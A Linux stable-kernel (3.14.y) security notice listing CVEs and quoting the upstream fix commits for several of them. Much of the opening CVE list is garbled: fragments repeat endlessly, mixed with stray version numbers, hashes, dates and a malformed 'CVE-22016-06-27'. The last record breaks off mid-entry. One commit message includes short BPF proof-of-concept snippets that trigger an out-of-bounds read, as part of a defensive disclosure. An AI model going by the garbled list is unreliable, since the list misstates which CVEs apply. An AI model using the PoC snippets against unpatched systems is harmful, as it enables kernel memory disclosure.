
-----------------------------
Stable Kernel Security Notice
2016-11-06

Stable Branch: linux-3.14.y

All linux-3.14.y CVEs:
http://joshuahunt.github.io/cve-tracker/linux-3.14.y-stable-cve-list.html

CVE(s) in report:

CVE-2014-0196
CVE-2014-0206
CVE-2014-2739
CVE-2014-2851
CVE-2014-3122
CVE-2014-3144
CVE-2014-3145
CVE-2014-3153
CVE-2014-3153
CVE-2014-3153
CVE-2014-3153
CVE-2014-3181
CVE-2014-3182
CVE-2014-3183
CVE-2014-3184
CVE-2014-3185
CVE-2014-3186
CVE-2014-3534
CVE-2014-3601
CVE-2014-3610
CVE-2014-3611
CVE-2014-3631
CVE-2014-3646
CVE-2014-3647
CVE-2014-3647
CVE-2014-3673
CVE-2014-3687
CVE-2014-3688
CVE-2014-3690
CVE-2014-3917
CVE-2014-3940
CVE-2014-4014
CVE-2014-4157
CVE-2014-4171
CVE-2014-4171
CVE-2014-4171
CVE-2014-4508
CVE-2014-4608
CVE-2014-4608
CVE-2014-4611
CVE-2014-4652
CVE-2014-4653
CVE-2014-4654
CVE-2014-4655
CVE-2014-4656
CVE-2014-4656
CVE-2014-4667
CVE-2014-4699
CVE-2014-4943
CVE-2014-5045
CVE-2014-5077
CVE-2014-5206
CVE-2014-5206
CVE-2014-5207
CVE-2014-5207
CVE-2014-5471
CVE-2014-5472
CVE-2014-6410
CVE-2014-6416
CVE-2014-6417
CVE-2014-6418
CVE-2014-7145
CVE-2014-7283
CVE-2014-7284
CVE-2014-7822
CVE-2014-7825
CVE-2014-7826
CVE-2014-7841
CVE-2014-7975
CVE-2014-8086
CVE-2014-8133
CVE-2014-8134
CVE-2014-8159
CVE-2014-8160
CVE-2014-8369
CVE-2014-8480
CVE-2014-8480
CVE-2014-8481
CVE-2014-8559
CVE-2014-8559
CVE-2014-8884
CVE-2014-8989
CVE-2014-8989
CVE-2014-8989
CVE-2014-8989
CVE-2014-9090
CVE-2014-9322
CVE-2014-9322
CVE-2014-9419
CVE-2014-9420
CVE-2014-9428
CVE-2014-9529
CVE-2014-9584
CVE-2014-9585
CVE-2014-9644
CVE-2014-9683
CVE-2014-9710
CVE-2014-9715
CVE-2014-9717
CVE-2014-9728
CVE-2014-9728
CVE-2014-9728
CVE-2014-9729
CVE-2014-9730
CVE-2014-9731
CVE-2014-9803
CVE-2014-9904
CVE-2015-0239
CVE-2015-0272
CVE-2015-0274
CVE-2015-0275
CVE-2015-1328
CVE-2015-1333
CVE-2015-1339
CVE-2015-1420
CVE-2015-1421
CVE-2015-1465
CVE-2015-1573
CVE-2015-1593
CVE-2015-1805
CVE-2015-1805
CVE-2015-2041
CVE-2015-2042
CVE-2015-2150
CVE-2015-2666
CVE-2015-2672
CVE-2015-2686
CVE-2015-2830
CVE-2015-2922
CVE-2015-2925
CVE-2015-2925
CVE-2015-3212
CVE-2015-3288
CVE-2015-3290
CVE-2015-3291
CVE-2015-3331
CVE-2015-3332
CVE-2015-3636
CVE-2015-4001
CVE-2015-4002
CVE-2015-4002
CVE-2015-4003
CVE-2015-4004
CVE-2015-4036
CVE-2015-4167
CVE-2015-4176
CVE-2015-4177
CVE-2015-4178
CVE-2015-4692
CVE-2015-4700
CVE-2015-5156
CVE-2015-5157
CVE-2015-5257
CVE-2015-5283
CVE-2015-5307
CVE-2015-5327
CVE-2015-5364
CVE-2015-5366
CVE-2015-5697
CVE-2015-5706
CVE-2015-5707
CVE-2015-5707
CVE-2015-6252
CVE-2015-6526
CVE-2015-6937
CVE-2015-7312
CVE-2015-7513
CVE-2015-7515
CVE-2015-7550
CVE-2015-7566
CVE-2015-7613
CVE-2015-7799
CVE-2015-7799
CVE-2015-7833
CVE-2015-7833
CVE-2015-7837
CVE-2015-7872
CVE-2015-7884
CVE-2015-7885
CVE-2015-7990
CVE-2015-8019
CVE-2015-8104
CVE-2015-8215
CVE-2015-8374
CVE-2015-8539
CVE-2015-8543
CVE-2015-8550
CVE-2015-8550
CVE-2015-8550
CVE-2015-8550
CVE-2015-8550
CVE-2015-8550
CVE-2015-8550
CVE-2015-8551
CVE-2015-8551
CVE-2015-8551
CVE-2015-8551
CVE-2015-8551
CVE-2015-8552
CVE-2015-8552
CVE-2015-8552
CVE-2015-8552
CVE-2015-8552
CVE-2015-8569
CVE-2015-8575
CVE-2015-8660
CVE-2015-8709
CVE-2015-8746
CVE-2015-8767
CVE-2015-8785
CVE-2015-8787
CVE-2015-8812
CVE-2015-8816
CVE-2015-8830
CVE-2015-8839
CVE-2015-8839
CVE-2015-8839
CVE-2015-8839
CVE-2015-8844
CVE-2015-8845
CVE-2015-8944
CVE-2015-8950
CVE-2015-8952
CVE-2015-8953
CVE-2015-8955
CVE-2015-8956
CVE-2015-8970
CVE-2015-8970
CVE-2015-8970
CVE-2015-8970
CVE-2015-8970
CVE-2015-8970
CVE-2015-8970
CVE-2015-8970
CVE-2015-8970
CVE-2016-0617
CVE-2016-0723
CVE-2016-0728
CVE-2016-0758
CVE-2016-0774
CVE-2016-0821
CVE-2016-0823
CVE-2016-1237
CVE-2016-1237
CVE-2016-1575
CVE-2016-1575
CVE-2016-1576
CVE-2016-1576
CVE-2016-1583
CVE-2016-1583
CVE-2016-1583
CVE-2016-2053
CVE-2016-2069
CVE-2016-2069
CVE-2016-2070
CVE-2016-2085
CVE-2016-2117
CVE-2016-2143
CVE-2016-2184
CVE-2016-2184
CVE-2016-2185
CVE-2016-2186
CVE-2016-2187
CVE-2016-2188
CVE-2016-2383
CVE-2016-2384
CVE-2016-2543
CVE-2016-2544
CVE-2016-2545
CVE-2016-2546
CVE-2016-2547
CVE-2016-2548
CVE-2016-2549
CVE-2016-2550
CVE-2016-2782
CVE-2016-2847
CVE-2016-3070
CVE-2016-3134
CVE-2016-3134
CVE-2016-3134
CVE-2016-3135
CVE-2016-3136
CVE-2016-3137
CVE-2016-3138
CVE-2016-3140
CVE-2016-3156
CVE-2016-3157
CVE-2016-3672
CVE-2016-3689
CVE-2016-3713
CVE-2016-3841
CVE-2016-3857
CVE-2016-3951
CVE-2016-3951
CVE-2016-3955
CVE-2016-3961
CVE-2016-4440
CVE-2016-4470
CVE-2016-4482
CVE-2016-4485
CVE-2016-4486
CVE-2016-4557
CVE-2016-4558
CVE-2016-4565
CVE-2016-4569
CVE-2016-4578
CVE-2016-4578
CVE-2016-4580
CVE-2016-4581
CVE-2016-4794
CVE-2016-4794
CVE-2016-4805
CVE-2016-4913
CVE-2016-4951
CVE-2016-4997
CVE-2016-4997
CVE-2016-4997
CVE-2016-4998
CVE-2016-4998
CVE-2016-4998
CVE-2016-5195
CVE-2016-5243
CVE-2016-5244
CVE-2016-5400
CVE-2016-5412
CVE-2016-5412
CVE-2016-5696
CVE-2016-5728
CVE-2016-5828
CVE-2016-5829
CVE-2016-6130
CVE-2016-6136
CVE-2016-6156
CVE-2016-6187
CVE-2016-6197
CVE-2016-6198
CVE-2016-6198
CVE-2016-6327
CVE-2016-6480
CVE-2016-6516
CVE-2016-6828
CVE-2016-7039
CVE-2016-7039
CVE-2016-7042
CVE-2016-7097
CVE-2016-7117
CVE-2016-7425
CVE-2016-8658
CVE-2016-8666
2.6
CVE-2016-7425
CVE-2016-8658
CVE-2016-8666
54dbc15172375641ef03399e8f911d7165eb90fb
CVE-2016-6828
CVE-2016-7039
CVE-2016-7039
CVE-2016-7042
CVE-2016-7097
CVE-2016-7117
CVE-2016-7425
CVE-2016-8658
CVE-2016-8666
-
CVE-2016-7117
CVE-2016-7425
CVE-2016-8658
CVE-2016-8666
-
CVE-2016-8658
CVE-2016-8666
4.9
CVE-2016-7117
CVE-2016-7425
CVE-2016-8658
CVE-2016-8666
4.9
CVE-2016-8658
CVE-2016-8666
2.6
CVE-2016-7039
CVE-2016-7039
CVE-2016-7042
CVE-2016-7117
CVE-2016-7425
CVE-2016-8658
CVE-2016-8666
CVE-2016-7042
CVE-2016-7097
CVE-2016-7117
CVE-2016-7425
CVE-2016-8658
CVE-2016-8666
3.14.67
CVE-2016-7425
CVE-2016-8658
CVE-2016-8666
-
CVE-2016-7039
CVE-2016-7042
CVE-2016-7097
CVE-2016-7117
CVE-2016-7425
CVE-2016-8658
CVE-2016-8666
3.14.78
CVE-2016-6516
CVE-2016-6828
CVE-2016-7039
CVE-2016-7039
CVE-2016-7042
CVE-2016-7097
CVE-2016-7117
CVE-2016-7425
CVE-2016-8658
CVE-2016-8666
4.6
CVE-2016-6480
CVE-2016-6516
CVE-2016-6828
CVE-2016-7039
CVE-2016-7039
CVE-2016-7042
CVE-2016-7097
CVE-2016-7117
CVE-2016-7425
CVE-2016-8658
CVE-2016-8666
CVE-2016-7039
CVE-2016-7042
CVE-2016-7097
CVE-2016-7117
CVE-2016-7425
CVE-2016-8658
CVE-2016-8666
4.7
CVE-2016-5412
CVE-2016-5412
CVE-2016-5696
CVE-2016-5728
CVE-2016-5828
CVE-2016-5829
CVE-2016-6130
CVE-2016-6136
CVE-2016-6156
CVE-2016-6187
CVE-2016-6197
CVE-2016-6198
CVE-2016-6198
CVE-2016-6327
CVE-2016-6480
CVE-2016-6516
CVE-2016-6828
CVE-2016-7039
CVE-2016-7039
CVE-2016-7042
CVE-2016-7097
CVE-2016-7117
CVE-2016-7425
CVE-2016-8658
CVE-2016-8666
51093254bf879bc9ce96590400a87897c7498463
CVE-2016-6480
CVE-2016-6516
CVE-2016-6828
CVE-2016-7039
CVE-2016-7039
CVE-2016-7042
CVE-2016-7097
CVE-2016-7117
CVE-2016-7425
CVE-2016-8658
CVE-2016-8666
4.9
CVE-2016-7117
CVE-2016-7425
CVE-2016-8658
CVE-2016-8666
4.9
CVE-2016-8658
CVE-2016-8666
2012-09-28
CVE-2016-8666
2016-09-07
CVE-2016-6516
CVE-2016-6828
CVE-2016-7039
CVE-2016-7039
CVE-2016-7042
CVE-2016-7097
CVE-2016-7117
CVE-2016-7425
CVE-2016-8658
CVE-2016-8666
3.14.79
CVE-2016-6136
CVE-2016-6156
CVE-2016-6187
CVE-2016-6197
CVE-2016-6198
CVE-2016-6198
CVE-2016-6327
CVE-2016-6480
CVE-2016-6516
CVE-2016-6828
CVE-2016-7039
CVE-2016-7039
CVE-2016-7042
CVE-2016-7097
CVE-2016-7117
CVE-2016-7425
CVE-2016-8658
CVE-2016-8666
4.2
CVE-2016-7042
CVE-2016-7097
CVE-2016-7117
CVE-2016-7425
CVE-2016-8658
CVE-2016-8666
-
CVE-2016-7039
CVE-2016-7042
CVE-2016-7097
CVE-2016-7117
CVE-2016-7425
CVE-2016-8658
CVE-2016-8666
6859d49475d4f32abe640372117e4b687906e6b6
CVE-2016-7039
CVE-2016-7039
CVE-2016-7042
CVE-2016-7097
CVE-2016-7117
CVE-2016-7425
CVE-2016-8658
CVE-2016-8666
f69bcbf3b4c4b333dcd7a48eaf868bf0c88edab5
CVE-2016-5829
CVE-2016-6130
CVE-2016-6136
CVE-2016-6156
CVE-2016-6187
CVE-2016-6197
CVE-2016-6198
CVE-2016-6198
CVE-2016-6327
CVE-2016-6480
CVE-2016-6516
CVE-2016-6828
CVE-2016-7039
CVE-2016-7039
CVE-2016-7042
CVE-2016-7097
CVE-2016-7117
CVE-2016-7425
CVE-2016-8658
CVE-2016-8666
4.7
CVE-2016-6130
CVE-2016-6136
CVE-2016-6156
CVE-2016-6187
CVE-2016-6197
CVE-2016-6198
CVE-2016-6198
CVE-2016-6327
CVE-2016-6480
CVE-2016-6516
CVE-2016-6828
CVE-2016-7039
CVE-2016-7039
CVE-2016-7042
CVE-2016-7097
CVE-2016-7117
CVE-2016-7425
CVE-2016-8658
CVE-2016-8666
4.6
CVE-2016-6198
CVE-2016-6327
CVE-2016-6480
CVE-2016-6516
CVE-2016-6828
CVE-2016-7039
CVE-2016-7039
CVE-2016-7042
CVE-2016-7097
CVE-2016-7117
CVE-2016-7425
CVE-2016-8658
CVE-2016-8666
2.6
CVE-2016-7039
CVE-2016-7039
CVE-2016-7042
CVE-2016-7097
CVE-2016-7117
CVE-2016-7425
CVE-2016-8658
CVE-2016-8666
43761473c254b45883a64441dd0bc85a42f3645c
CVE-2016-6156
CVE-2016-6187
CVE-2016-6197
CVE-2016-6198
CVE-2016-6198
CVE-2016-6327
CVE-2016-6480
CVE-2016-6516
CVE-2016-6828
CVE-2016-7039
CVE-2016-7039
CVE-2016-7042
CVE-2016-7097
CVE-2016-7117
CVE-2016-7425
CVE-2016-8658
CVE-2016-8666
4.8
CVE-2016-6516
CVE-2016-6828
CVE-2016-7039
CVE-2016-7039
CVE-2016-7042
CVE-2016-7097
CVE-2016-7117
CVE-2016-7425
CVE-2016-8658
CVE-2016-8666
4.5
CVE-2016-6197
CVE-2016-6198
CVE-2016-6198
CVE-2016-6327
CVE-2016-6480
CVE-2016-6516
CVE-2016-6828
CVE-2016-7039
CVE-2016-7039
CVE-2016-7042
CVE-2016-7097
CVE-2016-7117
CVE-2016-7425
CVE-2016-8658
CVE-2016-8666
30a46a4647fd1df9cf52e43bf467f0d9265096ca
CVE-2016-6197
CVE-2016-6198
CVE-2016-6198
CVE-2016-6327
CVE-2016-6480
CVE-2016-6516
CVE-2016-6828
CVE-2016-7039
CVE-2016-7039
CVE-2016-7042
CVE-22016-06-27
CVE-2016-7425
CVE-2016-8658
CVE-2016-8666
4.5
CVE-2016-6197
CVE-2016-6198
CVE-2016-6198
CVE-2016-6327
CVE-2016-6480
CVE-2016-6516
CVE-2016-6828
CVE-2016-7039
CVE-2016-7039
CVE-2016-7042
CVE-2016-7097
CVE-2016-7117
CVE-2016-7425
CVE-2016-8658
CVE-2016-8666
4.5
CVE-2016-6197
CVE-2016-6198
CVE-2016-6198
CVE-2016-6327
CVE-2016-6480
CVE-2016-6516
CVE-2016-6828
CVE-2016-7039
CVE-2016-7039
CVE-2016-7042
CVE-2016-7097
CVE-2016-7117
CVE-2016-7425
CVE-2016-8658
CVE-2016-8666
3.15
CVE-2016-5696
CVE-2016-5728
CVE-2016-5828
CVE-2016-5829
CVE-2016-6130
CVE-2016-6136
CVE-2016-6156
CVE-2016-6187
CVE-2016-6197
CVE-2016-6198
CVE-2016-6198
CVE-2016-6327
CVE-2016-6480
CVE-2016-6516
CVE-2016-6828
CVE-2016-7039
CVE-2016-7039
CVE-2016-7042
CVE-2016-7097
CVE-2016-7117
CVE-2016-7425
CVE-2016-8658
CVE-2016-8666
ff19f63ed47309550b47831ac39176d9910fadfe
CVE-2016-5829
CVE-2016-6130
CVE-2016-6136
CVE-2016-6156
CVE-2016-6187
CVE-2016-6197
CVE-2016-6198
CVE-2016-6198
CVE-2016-6327
CVE-2016-6480
CVE-2016-6516
CVE-2016-6828
CVE-2016-7039
CVE-2016-7039
CVE-2016-7042
CVE-2016-7097
CVE-2016-7117
CVE-2016-7425
CVE-2016-8658
CVE-2016-8666
2016-07-08
CVE-2016-6197
CVE-2016-6198
CVE-2016-6198
CVE-2016-6327
CVE-2016-6480
CVE-2016-6516
CVE-2016-6828
CVE-2016-7039
CVE-2016-7039
CVE-2016-7042
CVE-2016-7097
CVE-2016-7117
CVE-2016-7425
CVE-2016-8658
CVE-2016-8666
9bf292bfca94694a721449e3fd752493856710f6
CVE-2016-5828
CVE-2016-5829
CVE-2016-6130
CVE-2016-6136
CVE-2016-6156
CVE-2016-6187
CVE-2016-6197
CVE-2016-6198
CVE-2016-6198
CVE-2016-6327
CVE-2016-6480
CVE-2016-6516
CVE-2016-6828
CVE-2016-7039
CVE-2016-7039
CVE-2016-7042
CVE-2016-7097
CVE-2016-7117
CVE-2016-7425
CVE-2016-8658
CVE-2016-8666
1a1a143daf84db95dd7212086042004a3abb7bc2
CVE-2016-4997
CVE-2016-4997
CVE-2016-4997
CVE-2016-4998
CVE-2016-4998
CVE-2016-4998
CVE-2016-5195
CVE-2016-5243
CVE-2016-5244
CVE-2016-5400
CVE-2016-5412
CVE-2016-5412
CVE-2016-5696
CVE-2016-5728
CVE-2016-5828
CVE-2016-5829
CVE-2016-6130
CVE-2016-6136
CVE-2016-6156
CVE-2016-6187
CVE-2016-6197
CVE-2016-6198
CVE-2016-6198
CVE-2016-6327
CVE-2016-6480
CVE-2016-6516
CVE-2016-6828
CVE-2016-7039
CVE-2016-7039
CVE-2016-7042
CVE-2016-7097
CVE-2016-7117
CVE-2016-7425
CVE-2016-8658
CVE-2016-8666

CVE-2016-5829
CVE-2016-6130
CVE-2016-6136
CVE-2016-6156
CVE-2016-6187
CVE-2016-6197
CVE-2016-6198
CVE-2016-6198
CVE-2016-6327
CVE-2016-6480
CVE-2016-6516
CVE-2016-6828
CVE-2016-7039
CVE-2016-7039
CVE-2016-7042
CVE-2016-7097
CVE-2016-7117
CVE-2016-7425
CVE-2016-8658
CVE-2016-8666
-----------------------------

Details:

*************
CVE-2014-0196:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.4.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 4291086b1f081b869c6d79e5b7441633dc3ace00
Author: Peter Hurley <peter@hurleysoftware.com>
Date:   Sat May 3 14:04:59 2014 +0200

    n_tty: Fix n_tty_write crash when echoing in raw mode
    
    The tty atomic_write_lock does not provide an exclusion guarantee for
    the tty driver if the termios settings are LECHO & !OPOST.  And since
    it is unexpected and not allowed to call TTY buffer helpers like
    tty_insert_flip_string concurrently, this may lead to crashes when
    concurrect writers call pty_write. In that case the following two
    writers:
    * the ECHOing from a workqueue and
    * pty_write from the process
    race and can overflow the corresponding TTY buffer like follows.
    
    If we look into tty_insert_flip_string_fixed_flag, there is:
      int space = __tty_buffer_request_room(port, goal, flags);
      struct tty_buffer *tb = port->buf.tail;
      ...
      memcpy(char_buf_ptr(tb, tb->used), chars, space);
      ...
      tb->used += space;
    
    so the race of the two can result in something like this:
                  A                                B
    __tty_buffer_request_room
                                      __tty_buffer_request_room
    memcpy(buf(tb->used), ...)
    tb->used += space;
                                      memcpy(buf(tb->used), ...) ->BOOM
    
    B's memcpy is past the tty_buffer due to the previous A's tb->used
    increment.
    
    Since the N_TTY line discipline input processing can output
    concurrently with a tty write, obtain the N_TTY ldisc output_lock to
    serialize echo output with normal tty writes.  This ensures the tty
    buffer helper tty_insert_flip_string is not called concurrently and
    everything is fine.
    
    Note that this is nicely reproducible by an ordinary user using
    forkpty and some setup around that (raw termios + ECHO). And it is
    present in kernels at least after commit
    d945cb9cce20ac7143c2de8d88b187f62db99bdc (pty: Rework the pty layer to
    use the normal buffering logic) in 2.6.31-rc3.
    
    js: add more info to the commit log
    js: switch to bool
    js: lock unconditionally
    js: lock only the tty->ops->write call
    
    References: CVE-2014-0196
    Reported-and-tested-by: Jiri Slaby <jslaby@suse.cz>
    Signed-off-by: Peter Hurley <peter@hurleysoftware.com>
    Signed-off-by: Jiri Slaby <jslaby@suse.cz>
    Cc: Linus Torvalds <torvalds@linux-foundation.org>
    Cc: Alan Cox <alan@lxorguk.ukuu.org.uk>
    Cc: <stable@vger.kernel.org>
    Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

 drivers/tty/n_tty.c |    4 ++++
 1 file changed, 4 insertions(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2014-05-07
CVE: CVE-2014-0196
Break Date: 2009-07-08
Break Commit: d945cb9cce20ac7143c2de8d88b187f62db99bdc
Break Tag: 2.6
Linus Fix Date: 2014-05-03
Linus Commit: 4291086b1f081b869c6d79e5b7441633dc3ace00
Linus Tag: 3.15
Stable Date: 2014-05-13
Stable Commit: 6d194d6e0d832e622d87b8dab4e2122c555a82e9
Stable Tag: 3.14.4

CVE-2014-0206:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.10.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit edfbbf388f293d70bf4b7c0bc38774d05e6f711a
Author: Benjamin LaHaise <bcrl@kvack.org>
Date:   Tue Jun 24 13:32:51 2014 -0400

    aio: fix kernel memory disclosure in io_getevents() introduced in v3.10
    
    A kernel memory disclosure was introduced in aio_read_events_ring() in v3.10
    by commit a31ad380bed817aa25f8830ad23e1a0480fef797.  The changes made to
    aio_read_events_ring() failed to correctly limit the index into
    ctx->ring_pages[], allowing an attacked to cause the subsequent kmap() of
    an arbitrary page with a copy_to_user() to copy the contents into userspace.
    This vulnerability has been assigned CVE-2014-0206.  Thanks to Mateusz and
    Petr for disclosing this issue.
    
    This patch applies to v3.12+.  A separate backport is needed for 3.10/3.11.
    
    Signed-off-by: Benjamin LaHaise <bcrl@kvack.org>
    Cc: Mateusz Guzik <mguzik@redhat.com>
    Cc: Petr Matousek <pmatouse@redhat.com>
    Cc: Kent Overstreet <kmo@daterainc.com>
    Cc: Jeff Moyer <jmoyer@redhat.com>
    Cc: stable@vger.kernel.org

 fs/aio.c |    3 +++
 1 file changed, 3 insertions(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2014-06-25
CVE: CVE-2014-0206
Break Date: 2013-05-07
Break Commit: a31ad380bed817aa25f8830ad23e1a0480fef797
Break Tag: 3.10
Linus Fix Date: 2014-06-24
Linus Commit: edfbbf388f293d70bf4b7c0bc38774d05e6f711a
Linus Tag: 3.17
Stable Date: 2014-06-30
Stable Commit: aa011e29c725b391e614ee7babe6f890a00e3fc5
Stable Tag: 3.14.10

CVE-2014-2739:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.3.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit b2853fd6c2d0f383dbdf7427e263eb576a633867
Author: Moni Shoua <monis@mellanox.com>
Date:   Thu Mar 27 10:52:58 2014 +0200

    IB/core: Don't resolve passive side RoCE L2 address in CMA REQ handler
    
    The code that resolves the passive side source MAC within the rdma_cm
    connection request handler was both redundant and buggy, so remove it.
    
    It was redundant since later, when an RC QP is modified to RTR state,
    the resolution will take place in the ib_core module.  It was buggy
    because this callback also deals with UD SIDR exchange, for which we
    incorrectly looked at the REQ member of the CM event and dereferenced
    a random value.
    
    Fixes: dd5f03beb4f7 ("IB/core: Ethernet L2 attributes in verbs/cm structures")
    Signed-off-by: Moni Shoua <monis@mellanox.com>
    Signed-off-by: Or Gerlitz <ogerlitz@mellanox.com>
    Signed-off-by: Roland Dreier <roland@purestorage.com>

 drivers/infiniband/core/cm.c  |   17 -----------------
 drivers/infiniband/core/cma.c |   26 --------------------------
 include/rdma/ib_cm.h          |    1 -
 3 files changed, 44 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2014-04-14
CVE: CVE-2014-2739
Break Date: 2014-01-14
Break Commit: dd5f03beb4f76ae65d76d8c22a8815e424fc607c
Break Tag: 3.14
Linus Fix Date: 2014-04-01
Linus Commit: b2853fd6c2d0f383dbdf7427e263eb576a633867
Linus Tag: 3.15
Stable Date: 2014-05-06
Stable Commit: 5daac1bcbb85cbf03e7e7d3cafeeb31977d82113
Stable Tag: 3.14.3

CVE-2014-2851:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.5.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit b04c46190219a4f845e46a459e3102137b7f6cac
Author: Wang, Xiaoming <xiaoming.wang@intel.com>
Date:   Mon Apr 14 12:30:45 2014 -0400

    net: ipv4: current group_info should be put after using.
    
    Plug a group_info refcount leak in ping_init.
    group_info is only needed during initialization and
    the code failed to release the reference on exit.
    While here move grabbing the reference to a place
    where it is actually needed.
    
    Signed-off-by: Chuansheng Liu <chuansheng.liu@intel.com>
    Signed-off-by: Zhang Dongxing <dongxing.zhang@intel.com>
    Signed-off-by: xiaoming wang <xiaoming.wang@intel.com>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 net/ipv4/ping.c |   15 +++++++++++----
 1 file changed, 11 insertions(+), 4 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2014-04-14
CVE: CVE-2014-2851
Break Date: 2011-05-13
Break Commit: c319b4d76b9e583a5d88d6bf190e079c4e43213d
Break Tag: 3.0
Linus Fix Date: 2014-04-13
Linus Commit: b04c46190219a4f845e46a459e3102137b7f6cac
Linus Tag: 3.15
Stable Date: 2014-05-31
Stable Commit: 2089f7346ae535fa444853426adfafef25107247
Stable Tag: 3.14.5

CVE-2014-3122:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.3.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 57e68e9cd65b4b8eb4045a1e0d0746458502554c
Author: Vlastimil Babka <vbabka@suse.cz>
Date:   Mon Apr 7 15:37:50 2014 -0700

    mm: try_to_unmap_cluster() should lock_page() before mlocking
    
    A BUG_ON(!PageLocked) was triggered in mlock_vma_page() by Sasha Levin
    fuzzing with trinity.  The call site try_to_unmap_cluster() does not lock
    the pages other than its check_page parameter (which is already locked).
    
    The BUG_ON in mlock_vma_page() is not documented and its purpose is
    somewhat unclear, but apparently it serializes against page migration,
    which could otherwise fail to transfer the PG_mlocked flag.  This would
    not be fatal, as the page would be eventually encountered again, but
    NR_MLOCK accounting would become distorted nevertheless.  This patch adds
    a comment to the BUG_ON in mlock_vma_page() and munlock_vma_page() to that
    effect.
    
    The call site try_to_unmap_cluster() is fixed so that for page !=
    check_page, trylock_page() is attempted (to avoid possible deadlocks as we
    already have check_page locked) and mlock_vma_page() is performed only
    upon success.  If the page lock cannot be obtained, the page is left
    without PG_mlocked, which is again not a problem in the whole unevictable
    memory design.
    
    Signed-off-by: Vlastimil Babka <vbabka@suse.cz>
    Signed-off-by: Bob Liu <bob.liu@oracle.com>
    Reported-by: Sasha Levin <sasha.levin@oracle.com>
    Cc: Wanpeng Li <liwanp@linux.vnet.ibm.com>
    Cc: Michel Lespinasse <walken@google.com>
    Cc: KOSAKI Motohiro <kosaki.motohiro@jp.fujitsu.com>
    Acked-by: Rik van Riel <riel@redhat.com>
    Cc: David Rientjes <rientjes@google.com>
    Cc: Mel Gorman <mgorman@suse.de>
    Cc: Hugh Dickins <hughd@google.com>
    Cc: Joonsoo Kim <iamjoonsoo.kim@lge.com>
    Cc: <stable@vger.kernel.org>
    Signed-off-by: Andrew Morton <akpm@linux-foundation.org>
    Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

 mm/mlock.c |    2 ++
 mm/rmap.c  |   14 ++++++++++++--
 2 files changed, 14 insertions(+), 2 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2014-05-11
CVE: CVE-2014-3122
Break Date: 2008-10-20
Break Commit: b291f000393f5a0b679012b39d79fbc85c018233
Break Tag: 2.6
Linus Fix Date: 2014-04-07
Linus Commit: 57e68e9cd65b4b8eb4045a1e0d0746458502554c
Linus Tag: 3.15
Stable Date: 2014-05-06
Stable Commit: 9eef7172d412d1886b51f8c75b7e9b71c50203e3
Stable Tag: 3.14.3

CVE-2014-3144:
CVE-2014-3145:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.5.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 05ab8f2647e4221cbdb3856dd7d32bd5407316b3
Author: Mathias Krause <minipli@googlemail.com>
Date:   Sun Apr 13 18:23:33 2014 +0200

    filter: prevent nla extensions to peek beyond the end of the message
    
    The BPF_S_ANC_NLATTR and BPF_S_ANC_NLATTR_NEST extensions fail to check
    for a minimal message length before testing the supplied offset to be
    within the bounds of the message. This allows the subtraction of the nla
    header to underflow and therefore -- as the data type is unsigned --
    allowing far to big offset and length values for the search of the
    netlink attribute.
    
    The remainder calculation for the BPF_S_ANC_NLATTR_NEST extension is
    also wrong. It has the minuend and subtrahend mixed up, therefore
    calculates a huge length value, allowing to overrun the end of the
    message while looking for the netlink attribute.
    
    The following three BPF snippets will trigger the bugs when attached to
    a UNIX datagram socket and parsing a message with length 1, 2 or 3.
    
     ,-[ PoC for missing size check in BPF_S_ANC_NLATTR ]--
     | ld	#0x87654321
     | ldx	#42
     | ld	#nla
     | ret	a
     `---
    
     ,-[ PoC for the same bug in BPF_S_ANC_NLATTR_NEST ]--
     | ld	#0x87654321
     | ldx	#42
     | ld	#nlan
     | ret	a
     `---
    
     ,-[ PoC for wrong remainder calculation in BPF_S_ANC_NLATTR_NEST ]--
     | ; (needs a fake netlink header at offset 0)
     | ld	#0
     | ldx	#42
     | ld	#nlan
     | ret	a
     `---
    
    Fix the first issue by ensuring the message length fulfills the minimal
    size constrains of a nla header. Fix the second bug by getting the math
    for the remainder calculation right.
    
    Fixes: 4738c1db15 ("[SKFILTER]: Add SKF_ADF_NLATTR instruction")
    Fixes: d214c7537b ("filter: add SKF_AD_NLATTR_NEST to look for nested..")
    Cc: Patrick McHardy <kaber@trash.net>
    Cc: Pablo Neira Ayuso <pablo@netfilter.org>
    Signed-off-by: Mathias Krause <minipli@googlemail.com>
    Acked-by: Daniel Borkmann <dborkman@redhat.com>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 net/core/filter.c |    8 +++++++-
 1 file changed, 7 insertions(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2014-05-11
CVE: CVE-2014-3144
Break Date: 2008-04-10
